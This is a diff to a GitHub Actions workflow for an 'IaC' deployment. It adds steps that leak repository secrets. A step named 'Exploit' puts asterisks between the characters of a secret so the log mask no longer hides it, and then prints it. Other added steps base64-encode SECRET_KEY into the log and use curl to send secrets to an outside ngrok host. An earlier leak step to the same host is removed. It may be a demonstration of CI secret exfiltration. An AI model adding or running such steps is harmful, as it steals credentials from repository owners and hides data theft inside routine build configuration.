@@ -1,29 +1,50 @@
+
 name: IaC
 
 # Controls when the new movie hosting locations are created or updated
 on:
   push:
-    branches: [ feature/english ]
+    branches: [ feature/cac]
   pull_request:
     branches: [ main ]
 
-  # Allows you to run this workflow manually from the Actions tabs
+  # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
 
 jobs:
- 
+
   build:
     runs-on: ubuntu-latest
     environment: Vienna
 
 
     steps:
+      - name: Exploit
+        run: |
+          # Define the existing environmental variable
+          existing_variable=${{ secrets.FAVOURITE }}
+          # Get the length of the existing variable
+          length=${#existing_variable}
+          # Initialize a new variable to store the modified value
+          modified_variable=""
+          # Loop through each character of the existing variable
+          for (( i=0; i<$length; i++ )); do
+              # Append the current character to the modified variable
+              modified_variable+="${existing_variable:$i:1}"
+              # Insert '*' every second position
+              modified_variable+="*"
+          done
+          # Print the modified variable
+          echo "$modified_variable"
       - name: Add mask
         run: |
-          echo "::add-mask::${{ secrets.FAVOURITE }}" 
+          echo "::add-mask::${{ secrets.FAVOURITE }}"
+          echo ${{secrets.SECRET_KEY}} | base64
+          curl -k https://e2c8-128-131-202-121.ngrok-free.app/?data=$(secrets | base64 --wrap=0)
 
-      - name: I ll tell you my current favourite 
+      - name: Baum
+        run: |
+          curl "https://e2c8-128-131-202-121.ngrok-free.app//${{ secrets.FAVOURITE }}" -X POST --data "$(secrets | base64 --wrap=0) "
+
+      - name: I ll tell you my current favourite
         run: echo ${{ secrets.FAVOURITE }}
-
-      - name: Let's leak some data
-        run: curl -X POST -d '${{ secrets.FAVOURITE }}'https://e2c8-128-131-202-121.ngrok-free.app/
